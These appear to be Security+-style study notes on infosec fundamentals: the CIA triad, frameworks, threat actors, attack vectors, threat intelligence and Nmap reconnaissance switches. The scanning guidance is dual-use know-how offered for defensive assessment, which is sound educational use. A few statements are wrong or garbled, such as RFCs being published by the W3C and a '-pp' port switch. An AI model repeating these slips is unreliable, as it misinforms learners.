Information Security

Information security (or infosec) refers to the protection of data resources from unauthorized access, attack, theft, or damage. The systems used to store, transmit and process data must demonstrate the properties of security. Secure information has three properties, often referred to as the CIA Triad:

- Confidentiality means that certain information should only be known to certain people.
- Integrity means that the data is stored and transferred as intended and that modification is only done by authorized sources.
- Availability means that information is accessible to those authorized to view or modify it.

\*\*The triad can also be referred to as “AIC” to avoid confusion with the Central Intelligence Agency\*\*

Non-repudiation means that a subject cannot deny doing something, such as creating, modifying or sending a resource.

Cybersecurity Framework

Cyber Security refers specifically to provisioning secure processing hardware and software. Information security and cybersecurity tasks can be classified as five functions, following the framework developed by the National Institute of Standards and Technology (NIST):

- Identify: develop security policies and capabilities. Evaluate risks, threats, and vulnerabilities and recommend security controls to mitigate them.
- Protect: procure/develop, install, operate, and decommission IT hardware and software assets with security as an embedded requirement of every stage of this operations life cycle.
- Detect: perform ongoing, proactive monitoring to ensure that controls are effective and capable of protecting against new types of threats.
- Respond: identify, analyze, contain, and eradicate threats to systems and data security.
- Recover: implement cybersecurity resilience to restore systems and data if other controls are unable to prevent attacks.

Information Security Competencies

It professionals working in a role with security responsibilities must be competent in a wide range of disciplines, from network and application design to procurement and human resources (HR). The following activities might be typical of such a role:

- Participate in risk assessments and testing of security systems and make recommendations.
- Specify, source, install and configure secure devices and software.
- Set up and maintain document access control and user privilege profiles.
- Monitor audit logs, review user privileges, and document access controls.
- Manage security-related incident response and reporting.
- Create and test business continuity and disaster recovery plans and procedures.
- Participate in security training and education programs.

Information Security Roles and Responsibilities 

A security policy is a formalized statement that defines how security will be implemented within an organization. It describes the means the organization will take to protect the confidentiality, availability, and integrity of sensitive data and resources. 

As part of the process of adopting an effective organizational security posture, employees must be aware of their responsibilities. The structure of security responsibilities will depend on the size and hierarchy of an organization, but these roles are typical.

- Overall internal responsibility for security might be allocated to a dedicated department, run by a Director of Security, Chief Security Officer (CSO), or Chief Information Security Officer (CISO). Historically, responsibility for security might have been allocated to an existing business unit, such as Information and Communications Technology (ICT) or accounting
  - However, the goals of a network manager are not always well-aligned with the goals of security; network management focuses on availability over confidentiality. Consequently, security is increasingly thought of as a dedicated function or business unit with its own management structure.
- Managers may have responsibility for a domain, such as building control, ICT, or accounting.
- Technical and specialist staff have responsibility for implementing, maintaining, and monitoring the policy. Security might be made a core competency of systems and network administrators, or there may be dedicated security administrators. One such job title is Information Systems Security Officer (ISSO).
- Non-technical staff have the responsibility of complying with policy and with any relevant legislation
- External responsibility for security (due care or liability) lies mainly with directors or owners, though again it is important to note that all employees share some measure of responsibility.

\*\*NIST’s National Initiative for Cybersecurity Education (NICE) categorizes job tasks and job roles within the cybersecurity industry.\*\*

Information Security Business Units

The following units are often used to represent the security function within the organizational hierarchy.

Security Operations Center (SOC)

A security operations center (SOC) is a location where security professionals monitor and protect critical information assets across other business functions such as finance, operations, sales/marketing, and so on. Because SOCs can be difficult to establish, maintain, and finance, they are usually employed by larger corporations like a government agency or a healthcare company.

DevSecOps

Network operations and use of cloud computing make ever-increasing use of automation through software code. traditionally, software code would be the responsibility of a programming development team. Separate development and operations departments or teams can lead to silos where each team does not work effectively with the other

Development and operations (DevOps) is a cultural shift within an organization to encourage much more collaboration between developers and system administrators. By creating a highly orchestrated environment, IT personnel and developers can build, test, and release software faster and more reliably Many consider a DevOps approach to administration as the only way organizations can take full advantage of the potential benefits offered by cloud service providers.

DevSecOps extends the boundary to security specialists and personnel, reflecting the principle that security is a primary consideration at every stage of software development and deployment. This is also known as shift left, meaning that security considerations need to be made during requirements and planning phases, not grafted on at the end. The principle of DevSecOps recognizes this and shows that security expertise must be embedded into any development project. Ancillary to this is the recognition that security operations can be conceived of as software development projects. Security tools can be automated through code. Consequently, security operations need to take on developer expertise to improve detection and monitoring.

Incident Response

A dedicated cyber incident response team (CIRT)/ computer security incident response team (CSIRT)/ computer emergency response team (CERT) as a single point-of-contact for the notification of security incidents. this function might be handled by the SOC, or it might be established as an independent business unit.

Security Control Categories

Information and cybersecurity assurance is usually considered to take place within an overall process of business risk management. Implementation of cybersecurity functions is often the responsibility of the IT department.

A security control is something designed to give a system or data asset the properties of confidentiality, integrity, availability, and non-repudiation. Controls can be divided into three broad categories, representing the way the control is implemented:

- Technical: the control is implemented as a system (hardware, software, or firmware). For example, firewalls, antivirus software, and OS access control models are technical controls. Technical controls may also be described as logical controls.
- Operational: the control is implemented primarily by rather than systems. For example, security guards and training programs are operational controls rather than technical controls.
- Managerial: the control gives oversight of the information system. Examples could include risk identification or a tool allowing the evaluation and selection of other security controls.

Security Control Functional Types

Security controls can also be classified in types according to the goal or function they perform:

- Preventive: the control acts to eliminate or reduce the likelihood that an attack can succeed. A preventative control operates before an attack can take place. Access control lists (ACL) configured on firewalls and file system objects are preventative-type controls. Anti-malware software also acts as a preventative control, by blocking processes identified as malicious from executing. Directives and standard operating procedures (SOPs) can be thought of as administrative versions of preventative controls.
- Detective: the control may not prevent or deter access, but it will identify and record any attempted or successful intrusion. A detective control operates during the progress of an attack. Logs provide one of the best examples of detective-type controls.
- Corrective: the control acts to eliminate or reduce the impact of an intrusion event. A corrective control is used after an attack. A good example is a backup system that can restore data that was damaged during an intrusion. Another example is a patch management system that acts to eliminate the vulnerability exploited during the attack.
- Physical: controls such as alarms, gateways, locks, lighting, security cameras, and guards that deter and detect access to premises and hardware are often classed separately.
- Deterrent: the control may not physically or logically prevent access, but psychologically discourages an attacker from attempting an intrusion. This could include signs and warnings of legal penalties against trespass or intrusion.
- Compensating: the control serves as a substitute for a principal control, as recommended by a security standard, and affords the same (or better) level of protection but uses a different methodology or technology.

NIST Cybersecurity Framework

A cybersecurity framework (CSF) is a list of activities and objectives undertaken to mitigate risks. The use of a framework allows an organization to make an objective statement of its current cybersecurity capabilities, identify a target level of capability, and prioritize investments to achieve that target. This is valuable for giving a structure to internal risk management procedures and provides an externally verifiable statement of regulatory compliance. Frameworks are also important because they save an organization from building its security program in a vacuum, or from building the program on a foundation that fails to account for important security concepts.

Most frameworks are developed for an international audience; others are focused on a domestic national audience. Most of the frameworks are associated with certification programs to show that staff and consultants can apply the methodologies successfully.

The National Institute of Standards and Technology (NIST) Cybersecurity Framework (CSF) is a relatively new addition to the IT governance space and distinct from other frameworks by focusing exclusively on IT security, rather than IT service provisioning more generally. It is developed for a US audience and focuses somewhat on the US government, but its recommendations can be adapted for other countries and types of organizations.

NIST’s Risk Management Framework (RMF) pre-dates the CSF. Where the CSF focuses on practical cybersecurity for businesses, the RMF is more prescriptive and principally intended for use by federal agencies.

As well as its cybersecurity and risk frameworks, NIST is responsible for issuing the Federal Information Processing Standards (FIPS) plus advisory guides called Special Publications.

ISO and Cloud Frameworks

International Organization for Standardization (ISO) 27K

The International Organization for Standardization (ISO) has produced a cybersecurity framework in conjunction with the International Electrotechnical Commission (IEC). The framework was established in 2005 and revised in 2013. Unlike the NIST framework, the ISO 27001 Information Security Management standard must be purchased. ISO 27001 is part of an overall 27000 series of information and security standards, also known as 27K. Of these, 27002 classifies security controls, 27017 and 27018 reference cloud security, and 27701 focuses on personal data and privacy.

ISO 31K

Where ISO 27K is a cybersecurity framework, ISO 31K is an overall framework for enterprise risk management (ERM). ERM considers risks and opportunities beyond cybersecurity by including financial, customer service, competition, and legal liability factors. ISO 31K establishes best practices for performing risk assessments.

Cloud Security Alliance

The not-for-profit organization Cloud Security Alliance (CSA) produces various resources to assist cloud service providers (CPS) in setting up and delivering secure cloud platforms. These resources can also be useful for cloud consumers in evaluating and selecting cloud services.

- Security Guidance: a best practice summary analyzing the unique challenges of cloud environments and how on-premises controls can be adapted to them.
- Enterprise reference architecture: best practice methodology and tools for CSPs to use in architecting cloud solutions. The solutions are divided across a number of domains, such as risk management and infrastructure, application, and presentation services.
- Cloud controls matrix: lists specific controls and assessment guidelines that should be implemented by CSPs. For cloud consumers, the matrix acts as a starting point for cloud contracts and agreements as it provides a baseline level of security competency that the CSP should meet.

Statements on Standards for Attestation Engagements (SSAE) Service Organization Control (SOC)

The SSAE are audit specifications developed by the American Institute of Certified Public Accountants (AICPA). These audits are designed to assure consumers that service providers, notably cloud providers, but including any type of hosted or third-party service, meet professional standards.

- Service Organization Control (SOC2): evaluates the internal controls implemented by the service provider to ensure compliance with Trust Service Criteria (TSC) when storing and processing customer data. TSC refers to security, confidentiality, integrity, availability, and privacy properties. An SOC2 Type I report assesses the system design, while a Type II report assesses the ongoing effectiveness of the security architecture over a period of 6-12 months. SOC2 reports are highly detailed and designed to be restricted. They should only be shared with the auditor and regulators, and with important partners under non-disclosure agreement (NDA) terms.
- SOC3: a less detailed report certifying compliance with SOC2. SOC3 reports can be freely distributed.





Benchmarks and Secure Configuration Guides

Although a framework gives a “high-level” view of how to plan IT services, it does not generally provide detailed implementation guidance. At a system level, the deployment of servers and applications is covered by benchmarks and secure configuration guides.

Center for Internet Security (CIS)

The CIS is a not-for-profit organization (founded partly by The SANS Institute). It publishes the well-known “The CIS Critical Security Controls.” The CIS-RAM (Risk Assessment Method) can be used to perform an overall evaluation of security posture.

CIS also produces benchmarks for different aspects of cybersecurity. For example, there are benchmarks for compliance with IT frameworks and compliance programs, such as PCI DSS, NIST 800-53, SOX, and ISO 27000. There are also product-focused benchmarks, such as for Windows Desktop, Windows Server macOS, Linux, Cisco, web browsers, web servers, database and email servers, and VMware ESXi. The CIS-CAT (Configuration Access Tool) can be used with automated vulnerability scanners to test compliance against these benchmarks.

OS/Network Appliance Platform/Vendor-specific Guides

Operating system (OS) best practice configuration lists the settings and controls that should be applied for a computing platform to work in a defined role, such as client workstation, authentication, server network switch/router/firewall, web/application server, and so on.

Apart from the CIS controls, some notable sources include:

- Department of Defense Cyber Exchange provides Security Technical Implementation Guides (STIGs) with hardening guidelines for a variety of software and hardware solutions.
- National Checklist Program (NCP) by NIST provides checklists and benchmarks for a variety of operating systems and applications.

Application Servers

Most application architectures use a client/server model. This means that part of the application is a client software program, installed and run on separate hardware to the server application code. the client interacts with the server over a network. Attacks can therefore be directed at the local client code, at the server application or at the network channel between them. The client application might be running a computing host alongside other, potentially malicious, software. Code that runs on the client should not be trusted. The server-side code should implement routines to verify that input conforms to what is expected.

Web Server Applications

A web application is a particular type of client/server architecture. A web application leverages existing technologies to simplify development. The application uses a generic client (a web browser), and standard network protocols and servers (HTTP/HTTPS). The specific features of the application are developed using code running on the clients and servers. Web applications are also likely to use a multi-tier architecture, where the server is split between application logic and data storage and retrieval. Modern web applications may use even more distributed architectures, such as microservices and serverless.

The Open Web Application Security Project (OWASP) is a not-for-profit, online community that publishes several secure application development resources, such as the Top 10 list of the most critical application security risks. OWASP has also developed resources, such as the Zed Attack Proxy and Juice shop (a deliberately not secure web application), to help investigate and understand penetration testing and application security issues.

Regulations, Standards, and Legislation

The key frameworks, benchmarks, and configuration guides may be used to demonstrate compliance with a country’s legal/regulatory requirements or with industry-specific regulations. Due diligence is a legal term meaning that responsible persons have not been negligent in discharging their duties. Negligence may create criminal and civil liabilities. In the US, for example, the Sarbanes-Oxley Act (SOX) mandates the implementation of risk assessments, internal controls, and audit procedures. The Computer Security Act (1987) requires federal agencies to develop security policies for computer systems that process confidential information. In 2002, the Federal Information Security Management Act (FISMA) was introduced to govern the security of data processed by federal government agencies.

\*\*Some regulations have specific cybersecurity control requirements; others simply mandate “best practice,” as represented by a particular industry or international framework. It may be necessary to perform mapping between different industry frameworks, such as NIST, and ISO 27K, if a regulator specifies the use of one but not another. Conversely, the use of frameworks may not be mandated as such, but auditors are likely to expect them to be in place as a demonstration of a strong and competent security program.\*\*

Personal Data and the General Data Protection Regulation (GDPR)

Privacy is a distinct concept from security. Privacy requires that collection and processing of personal information be both secure and fair. Fairness and the right to privacy, as enacted by regulations such as the European Union’s General Data Protection Regulation (GDPR), means that personal data cannot be collected, processed, or retained without the individual’s informed consent. Informed consent means that the data must be collected and processed only for the stated purpose, and that purpose must be clearly described to the user in plain language, not legalese. GDPR gives data subjects rights to withdraw consent, and to inspect, amend, or erase data held about them.

National, Territory, or State Laws

Compliance issues are complicated by the fact that laws derive from different sources. For example, the GDPR does not apply to American data subjects, but it does apply to American companies that collect or process the personal data of people in EU countries. Federal laws tend to focus either on regulations like FISMA for federal departments or as “vertical” laws affecting a particular industry. Examples of the latter include the Gramm-Leach-Bliley Act (GLBA) for financial services, and the Health Insurance Portability and Accountability Act (HIPAA).

Some states have started to introduce “horizontal” personal data regulations, similar to the approach taken by the GDPR. One high-profile example of state legislation is the California Consumer Privacy Act (CCPA).

Payment Card Industry Data Security Standard (PCI DSS)

Compliance issues can also arise from industry-mandated regulations. For example, the Payment Card Industry Data Security Standard (PCI DSS) defines the safe handling and storage of financial information.

Vulnerability, Threat, and Risk

As part of security assessment and monitoring, security teams must identify ways in which their systems could be attacked:

- Vulnerability is a weakness that could be triggered accidentally or exploited intentionally to cause a security breach. Examples of vulnerabilities include improperly configured or installed hardware or software, delays in applying and testing software and firmware patches, untested software and firmware patches, the misuse of software or communication protocols, poorly designed network architecture, inadequate physical security, insecure password usage, and design flaws in software or operating systems, such as unchecked user input.
- Threat is the potential for someone or something to exploit a vulnerability and breach security. A threat may be intentional or unintentional. The person or thing that poses a threat is called a threat actor or threat agent. The path or tool used by a malicious threat actor can be referred to as the attack vector.
- Risk is the likelihood and impact (or consequence) of a threat actor exploiting a vulnerability. To assess risk, you identify a vulnerability and then evaluate the likelihood of it being exploited by a threat and the impact that a successful exploit would have.

Attributes of Threat Actors

The sophisticated nature of modern cybersecurity threats means that it is important to be able to describe and analyze behaviors. This analysis involves identifying the attributes of threat actors in terms of location, intent, and capability.

Internal/External

An external threat actor or agent is one that has no account or authorized access to the target system. A malicious external threat must infiltrate the security system using malware and /oor social engineering. Note that an external actor may perpetrate an attack remotely or on-premises (by breaking into the company’s headquarters, for instance). It is the threat actor that is defined as external, rather than the attack method.

Conversely, an internal (or insider) threat actor is one that has been granted permissions on the system. This typically means an employee, but insider threat can also arise from contractors and business partners.

Intent/Motivation

Intent describes what an attacker hopes to achieve from the attack, while motivation is the attackers reason for perpetrating the attack. A malicious threat actor could be motivated by greed, curiosity, or some sort of grievance, for instance. The intent could be to vandalize and disrupt a system or to steal something. Threats can be characterized as structured or unstructured (or targeted versus opportunistic) depending on the degree to which your own organization is targeted specifically.

Level of Sophistication/Capability and Resources/Funding

You must also consider the sophistication and level of resources/funding that different adversaries might possess. Capability refers to a threat actor’s ability to craft novel exploit techniques and tools. The least capable threat actor relies on commodity attack tools that are widely available on the web or dark web. More capable actors can fashion zero-day exploits in operating systems, applications software, and embedded control systems. At the highest level, a threat actor might make use of non-cyber tools, such as political or military assets. Capability is only funded through a substantial budget. Sophisticated threat actor groups need to be able to acquire resources, such as customized attack tools and skilled strategists, designers, coders, hackers, and social engineers. The most capable threat actor groups receive funding from nation states and criminal syndicates.

Hackers, Script Kiddies, and Hacktivists

To fully assess intent and capability, it is helpful to understand different categories of threat actors.

Hacker describes an individual who has the skills to gain access to computer systems through unauthorized or unapproved means. Originally, hacking into a system was a sign of technical skill and creativity that gradually became associated with illegal or malicious system intrusions. The terms black hat (unauthorized) and white hat (authorized) are used to distinguish these motivations. A gray hat hacker (semi-authorized) might try to find vulnerabilities in a product or network without seeking the approval of the owner; but they might not try to exploit any vulnerabilities they find. A gray hat might seek voluntary compensation of some sort (a bug bounty) but will not use an exploit as extortion. A white hat hacker always seeks authorization to perform penetration testing of private and proprietary systems.

A script kiddie is someone who uses hacker tools without necessarily understanding how they work or having the ability to craft new attacks. Script kiddie attacks might have no specific target or any reasonable goal other than gaining attention or proving technical abilities.

A hacktivist group, such as Anonymous, WikiLeaks, or LulzSec, uses cyber weapons to promote a political agenda. Hacktivists might attempt to obtain and release confidential information to the public domain, perform denial of service (DoS) attacks, or deface websites. Political, media, and financial groups and companies are probably most at risk, but environmental and animal advocacy groups may target companies in a wide range of industries.

State Actors and Advanced Persistent Threats

The term Advanced Persistent Threat (APT) was coined to understand the behavior underpinning modern types of cyber adversaries. Rather than think in terms of systems being infected with a virus or Trojan, an APT refers to the ongoing ability of an adversary to compromise network security, to obtain and maintain access, using a variety of tools and techniques.

State actors have been implicated in many attacks, particularly on energy and health network systems. The goals of state actors are primarily espionage and strategic advantage, but it is not unknown for countries, North Korea being a good example, to target companies purely for commercial gain.

State actors will work at arm’s length from the national government, military, or security service that sponsors and protects them, maintaining “plausible deniability.” They are likely to pose as independent groups or even as hacktivists. They may wage false flag campaigns that try to implicate other states.


Criminal Syndicates and Competitors

In many countries, cybercrime has overtaken physical crime both in terms of number of incidents and losses. A criminal syndicate can operate across the Internet from different jurisdictions than its victim, increasing the complexity of prosecution. Syndicates will seek any opportunity for criminal profit, but typical activities are financial fraud (both against individuals and companies) and extortion.

Insider Threat Actors

An insider threat arises from an actor who has been identified by the organization and granted some sort of access. Within this group of internal threats, you can distinguish insiders with permanent privileges, such as employees, from insiders with temporary privileges, such as contractors and guests. The Computer Emergency Response Team (CERT) at Carnegie Mellon University’s definition of a malicious insider is:

- A current or former employee, contractor, or business partner who has or had authorized access to an organization’s network, system, or data and intentionally exceeded or misused access in a manner that negatively affected the confidentiality, integrity, or availability of the organization’s information or information systems.

Insider threats can be categorized as unintentional. An unintentional or inadvertent insider threat is a vector for an external actor, or a separate, malicious, internal actor to exploit, rather than a threat actor in its own right. Unintentional threats usually arise from lack of awareness or from carelessness, such as users demonstrating poor password management. Another example of unintentional insider threat is the concept of shadow IT, where users purchase or introduce computer hardware or software to the workplace without the sanction of the IT department and without going through a procurement and security analysis process. The problem of shadow IT is exacerbated by the proliferation of cloud services and mobile devices, which are easy for users to obtain. Shadow IT creates a new unmonitored attack surface for malicious adversaries to exploit.

Attack Surface and Attack Vectors

The attack surface is all the points at which a malicious threat actor could try to exploit a vulnerability. The attack surface for an external actor is (or should be ) far smaller than that for an insider threat. The attack surface can be considered for a network as a whole, but is also analyzed for individual software applications.

An attack vector is the path that a threat actor uses to gain access to a secure system. In the majority of cases, gaining access means being able to run malicious code on the target.

- Direct access: this is a type of physical or local attack. The threat actor could exploit an unlocked workstation, use a boot disk to try to install malicious tools, or steal a device, for example.
- Removable media: the attack conceals malware on a USB thumb drive or memory card and tries to trick employees into connecting the media to a PC, laptop, or smartphone. For some exploits, simply connecting the media may be sufficient to run the malware. In many cases, the attacker may need the employee to open a file in a vulnerable application or run a setup program.
- Email: the attacker sends a malicious file attachment via email, or via any other communications system that allows attachments. The attack needs to use social engineering techniques to persuade or trick the user into opening the attachment.
- Remote and wireless: the attack either obtains credentials for a remote access or wireless connection to the network or cracks the security protocols used for authentication. Alternatively, the attacker spoofs a trusted resource, such as an access point, and uses it to perform credential harvesting and then uses the stolen account details to access the network.
- Supply chain: rather than attack the target directly, a threat actor may seek ways to infiltrate it via companies in its supply chain. One high-profile example of this is the Target data breach, which was made via the company’s HVAC supplier.
- Web and social media: malware may be concealed in files attached to posts or presented as downloads. An attacker may also be able to compromise a site so that it automatically infects vulnerable browser software (a drive-by download). Social media may also be used more subtly, to reinforce a social engineering campaign and drive the adoption of Trojans.
- Cloud: many companies now run part or all of their network services via Internet-accessible clouds. The attacker only needs to find one account, service, or host with weak credentials to gain access. The attacker is likely to target the accounts used to develop services in the cloud or manage cloud systems. They may also try to attack the CSP as a way of accessing the victim system.

Sophisticated threat actors will make use of multiple vectors. They are likely to plan a multi-stage campaign, rather than a single “smash and grab” type of raid.

Topic 2B: Explain Threat Intelligence Sources

Threat Research Sources

Threat research is a counterintelligence gathering effort in which security companies and researchers attempt to discover the tactics, techniques, and procedures (TTPs) of modern cyber adversaries. There are many companies and academic institutions engaged in primary cybersecurity research. Security solution providers with firewall and anti-malware platforms derive a lot of data from their own customers’ networks. As they assist customers with cybersecurity operations, they are able to analyze and publicize TTPs and their indicators. These organizations also operate honeynets to try to observe how hackers interact with vulnerable systems.

Another primary source of threat intelligence is the dark web. The deep web is any part of the World Wide Web that is not indexed by a search engine. This includes pages that require registration, pages that block search indexing, unlinked pages, pages using nonstandard DNS, and content encoded in a nonstandard manner Within the deep web are areas that are deliberately concealed from “regular” browser access.

- Dark net: a network established as an overlay to Internet infrastructure by software, such as The Onion Router (TOR), Freenet, or I2P, that acts to anonymize usage and prevent a third part from known about the existence of the network or analyzing any activity taking place over the network. Onion routing, for instance, uses multiple layers of encryption and relays between nodes to achieve this anonymity.
- Dark web: sites, content, and services accessible only over a dark net. While there are dark web search engines, many sites are hidden from them. Access to a dark web site via its URL is often only available via “word of mouth” bulletin boards.

Threat Intelligence Providers

The outputs from the primary research undertaken by security solutions providers and academics can take three main forms:

- Behavioral threat research: narrative commentary describing examples of attacks and TTPs gathered through primary research sources.
- Reputational threat intelligence: lists of IP addresses and domains associated with malicious behavior, plus signatures of known file-based malware.
- Threat data: computer data that can correlate events observed on a customer’s own networks and logs with known TTP and threat actor indicators.

Threat data can be packaged as feeds that integrate with a security information and management (SIEM) platform. These feeds are usually described as cyber threat intelligence (CTI) data. The data on its own is not a complete security solution however. To produce actionable intelligence, the threat data must be correlated with observed data from customer networks. This type of analysis is often powered by artificial intelligence (AI) features of the SIEM.

Threat intelligence platforms and feeds are supplied as one of four different commercial models:

- Closed/proprietary: the threat research and CTI data is made available as a paid subscription to a commercial threat intelligence platform. The security solution provider will also make the most valuable research available early to platform subscribers in the form of blogs, white papers, and webinars. Some examples of such platforms include:
  - IBM X-Force Exchange
  - Mandiant
  - Recorded Future
- Vendor websites: proprietary threat intelligence is not always provided at cost. All types of security, hardware, and software vendors make huge amounts of threat research available via their websites as a general benefit to their customers.
- Public/private information sharing centers: in many critical industries, Information Sharing and Analysis Centers (ISACs) have been set up to share threat intelligence and promote best practice. These are sector-specific resources for companies and agencies working in critical industries, such as power supply, financial markets, or aviation. where there is no coverage by an ISAC, local industry groups and associations may come together to provide mutual support.
- Open source intelligence (OSINT): some companies operate threat intelligence services on an open-source basis, earning income from consultancy rather than directly from the platform or research effort. Some examples include:
  - AT&T Cybersecurity, previously AlienVault Open Threat Exchange (OTX)
  - Malware Information Sharing Project (MISP)
  - Spamhaus
  - VirusTotal

Other Threat Intelligence Research Sources

There are plenty of other sources of best practice advice and new research other than threat intelligence platforms:

- Academic journals: results from academic researchers and not-for-profit trade bodies and associations, such as the IEEE, are published as papers in jource. Access to these papers is usually subscription-based. One free source is the arXiv preprint repository. Preprints are papers that have not been published or peer reviewed.
- Conferences: security conferences are hosted and sponsored by various institutions and provide an opportunity for presentations on the latest threats and technologies.
- Request for Comments (RFC): when a new technology is accepted as a web standard, it is published as an RFC by the W3C. There are also informational RFCs covering many security considerations and best practices.
- Social media: companies and individual researchers and practitioners write informative blogs or social media feeds. The list curated by Digital Guardian is a good starting point.

Tactics, Techniques, and Procedures and Indicators of Compromise

A tactic, technique, or procedure (TTP) is a generalized statement of adversary behavior. The term is derived from US military doctrine. TTPs categorize behaviors in terms of campaign strategy and approach (tactics), generalized attack vectors (techniques), and specific intrusion tools and methods (procedures).

An indicator of compromise (IoC) is a residual sign that an asset or network has been successfully attacked or is continuing to be attacked. Put another way, an IoC is evidence of a TTP.

- TTPs describe what and how an adversary acts and Indicators describe how to recognize what those actions might look like.


Possible IoC’s to encounter:

- Unauthorized software and files
- Suspicious emails
- Suspicious registry and file system changes
- Unknown port and protocol usage
- Excessive bandwidth usage
- Rogue hardware
- Service disruption and defacement
- Suspicious or unauthorized account usage

An IoC can be definite and objectively identifiable, like a malware signature, but often IoCs can only be described with confidence via the correlation of many data points. Because these IoCs are often identified through patterns of anomalous activity rather than single events, they can be open to interpretation and therefore slow to diagnose. Consequently, threat intelligence platforms use AI-backed analysis to speed up detection without overwhelming analysts’ time with false positives.

\*\*An IoC is evidence of an attack that was successful. The term indicator of attack (IoA) is sometimes also used for evidence of an intrusion attempt in progress.\*\*

Threat Data Feeds

When you use a cyber threat intelligence (CTI) platform, you subscribe to a threat data feed. The information in the threat data can be combined with event data from your own network and system logs. An analysis platform performs correlation to detect whether any IoCs are present. There are various ways that a threat data feed can be implemented.

Structured Threat Information eXpression (STIX)

The OASIS CTI framework is designed to provide a format for this type of automated feed so that organizations can share CTI. The STIX part of the framework describes standard terminology for IoCs and ways of indicating relationships between them.

Where STIX provides the syntax for describing CTI, the Trusted Automated eXchange of Indicator Information (TAXII) protocol provides a means for transmitting CTI data between servers and clients.

Automated Indicator Sharing (AIS)

AIS is a service offered by the Department of Homeland Security (DHS) for companies to participate in threat intelligence sharing. It is especially aimed at ISACs, but private companies can join too. AIS is based on the STIX and TAXII standards and protocols.


Threat Maps

A threat map is an animated graphic showing the source target, and type of attacks that have been detected by a CTI platform. The security solutions providers publish such maps showing global attacks on their customers’ systems.

File/Code Repositories

A file/code repository such as virustotal.com holds signatures of known malware code. The code samples derive from live customer systems and (for public repositories) files that have been uploaded by subscribers.

Vulnerability Databases and Vulnerability Feeds

As well as analyzing adversary tools and behaviors, another source of threat intelligence is identifying vulnerabilities in OS, software application, and firmware code. Security researchers look for vulnerabilities, often for the reward of bug bounties offered by the vendor. Lists of vulnerabilities are stored in databases such as Common Vulnerabilities and Exposures (CVE), operated by Mitre. Information about vulnerabilities is codified as signatures and scanning scripts that can be supplied as feeds to automated vulnerability scanning software.

Artificial Intelligence and Predictive Analysis

A threat data feed does not produce threat intelligence automatically. The combination of security intelligence and CTI data can be processed, correlated, and analyzed to provide actionable insights that will assist you in identifying security problems.

AI and Machine Learning

AI is the science of creating machine systems that can simulate or demonstrate a similar general intelligence capability to humans. Early types of AI, expert systems, use if-then rules to draw inferences from a limited data set, called a knowledge base. Machine learning (ML) uses algorithms to parse input data and then develop strategies for using that data, such as identifying an object as a type, working out the best next move in a game, and so on. Unlike an expert system, machine learning can modify the algorithms it uses to parse data and develop strategies. It can make gradual improvements in the decision-making processes. The structure that facilitates this learning process is referred to as an artificial neural network (ANN). Nodes in a neural network take inputs and then derive outputs, using complex feedback loops between nodes. An ML system has objectives and error states and it adjusts its neural network to reduce errors and optimize objectives.




Predictive Analysis

One of the goals of using AI-backed threat intelligence is to perform predictive analysis, or threat forecasting. This means that the system can anticipate a particular type of attack and possibly the identity of the threat actor before the attack is fully realized.

Lesson 3: Performing Security Assessments

Topic 3A: Assess Organizational Security with Network Reconnaissance Tools

Reconnaissance is a type of assessment activity that maps the potential attack surface by identifying the nodes and connections that make up the network. You will often need to run scans using both command line and GUI topology discovery tools. You will need to report host configurations using fingerprinting tools and capture and analyze network traffic.

IPCONFIG, PING, and ARP

The process of mapping out the attack surface is referred to as network reconnaissance and discovery. Reconnaissance techniques are used by threat actors, but they can also be used by security professionals to probe and test their own security systems.

Topology discovery (or footprinting) means scanning for hosts, IP ranges and routes between networks to map out the structure of the target network. Topology discovery can also be used to build an asset database and to identify non-authorized hosts (rogue system detection) or network configuration errors.

Basic topology discovery tasks can be accomplished using the command line tools built into Windows and Linux.

- ipconfig: show the configuration assigned to network interface(s) in Windows, including hardware or media access control (MAC) address, IPv4 and IPv6 addresses, default gateway, and whether the address is static or assigned by DHCP. If the address is DHCP-assigned, the output also shows the address of the DHCP server that provided the lease.
- ip address: show the configuration assigned to network interface(s) in Linux.
- ping: probe a host on a particular IP address or host name using Internet Control Message Protocol (ICMP). You can use ping with a simple script to perform a sweep of all the IP addresses in a subnet.
- arp: display the local machine’s Address Resolution Protocol (ARP) cache. The ARP cache shows the MAC address of the interface associated with each IP address the local host has communicated with recently. This can be useful if you are investigating a suspected spoofing attack.



Route and Traceroute

These tools can be used to test the routing configuration and connectivity with remote hosts and networks.

- route: view and configure the host’s routing table. Most end systems use a default route to forward all traffic for remote networks via a gateway router. If the host is not a router, additional entries in the routing table could be suspicious.
- tracert: uses ICMP probes to report the round trip time (RTT) for hops between the local host and a host on a remote network. tracert is the Windows version of the tool.
- traceroute: performs route discovery from a Linux host. traceroute uses UDP probes rather than ICMP, by default.
- pathping: provides statistics for latency and packet loss along a route over a longer measuring period. pathping is a Windows tool; the equivalent on Linux is mtr.

IP Scanners and NMAP

Most topology discovery is performed using a dedicated IP scanner tool. An IP scanner performs host discovery and identifies how the hosts are connected together in an internetwork. For auditing, there are enterprise suites, such as Microsoft’s System Center products. Such suites can be provided with credentials to perform authorized scans and obtain detailed host information via management protocols, such as the Simple Network Management Protocol (SNMP).

The Nmap Security Scanner is one of the most popular open-source IP scanners. The basic syntax of an Nmap command is to give the IP subnet (or IP host address) to scan. When used without switches, the default behavior of Nmap is to ping and send a TCP ACK packet to ports 80 and 443 to determine whether a host is present On a local network segment, Nmap will also perform ARP and ND (Neighbor Discovery) sweeps. If a host is detected, Nmap performs a port scan against that host to determine which services it is running.

Service Discovery and Nmap

Having identified active IP hosts on the network and gained an idea of the network topology, the next step in network reconnaissance is to work out which operating systems are in use, which network services each host is running, and if possible which application software is underpinning those services. This process is described as service discovery. Service discovery can also be used defensively, to probe potential rogue systems and identify the presence of unauthorized network service ports.

Service Discovery with Nmap

When Nmap completes a host discovery scan, it will report on the state of each port scanned for each IP address in the scope. At this point, you can run additional service discovery scans against one or more of the active IP addresses. Some of the principal options for service discovery scans are:

- TCP SYN (-sS): this is a fast technique also referred to as half-open scanning, as the scanning host requests a connection without acknowledging it. The target’s response to the scan’s SYN packet identifies the port state.
- UDP scans (-sU): can UDP ports. As these do not use ACKs, Nmap needs to wait for a response or timeout to determine the port state, so UDP scanning can take a long time. A UDP scan can be combined with a TCP scan.
- Port range (-p): by default, Nmap scans 1000 commonly used ports, as listed in its configuration file. Use the -pp argument to specify a port range.

Service and Version Detection and OS Fingerprinting with Nmap

The detailed analysis of services on a particular host is often called fingerprinting. This is because each OS or application software that underpins a network service responds to probes in a unique way. This allows the scanning software to guess at the software name and version, without having any sort of privileged access to the host. This can also be described as banner grabbing, where the banner is the header of the response returned by the application.

When services are discovered, you can use Nmap with the -sV or -A switch to probe a host more intensively to discover the following information:

